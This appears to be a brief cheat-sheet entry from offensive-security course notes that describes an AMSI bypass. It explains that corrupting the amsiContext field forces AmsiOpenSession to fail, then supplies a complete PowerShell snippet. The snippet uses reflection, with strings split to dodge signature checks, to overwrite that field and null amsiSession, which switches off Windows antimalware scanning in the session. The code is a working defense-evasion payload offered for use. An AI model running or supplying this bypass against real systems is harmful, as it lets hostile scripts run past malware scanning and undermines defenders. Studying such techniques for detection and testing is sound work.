# 16.03 AMSI Bypass 3 Force Error amsiContext

> Corrupt `amsiContext` so its first 4 bytes don't match `AMSI` — `AmsiOpenSession` returns `E_INVALIDARG` and flips `amsiInitFailed`.

## Overview

Force AmsiOpenSession to fail by corrupting the amsiContext value. AmsiOpenSession checks that first 4 bytes of amsiContext == 'AMSI'; if not, returns 0x80070057 (E_INVALIDARG), setting amsiInitFailed=true.

## Steps

- Get amsiContext and amsiSession private fields via reflection.
- **AllocHGlobal(4)** — allocate 4 garbage bytes for new amsiContext.
- **SetValue($null, $null)** on amsiSession — ensure correct branch is taken.

## Commands

### Force-error AMSI bypass (PowerShell)

```powershell
$utils   = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');
$context = $utils.GetField('amsi'+'Context','NonPublic,Static');
$session = $utils.GetField('amsi'+'Session','NonPublic,Static');
$marshal = [System.Runtime.InteropServices.Marshal];
$newCtx  = $marshal::AllocHGlobal(4);
$context.SetValue($null, $newCtx);
$session.SetValue($null, $null);
```
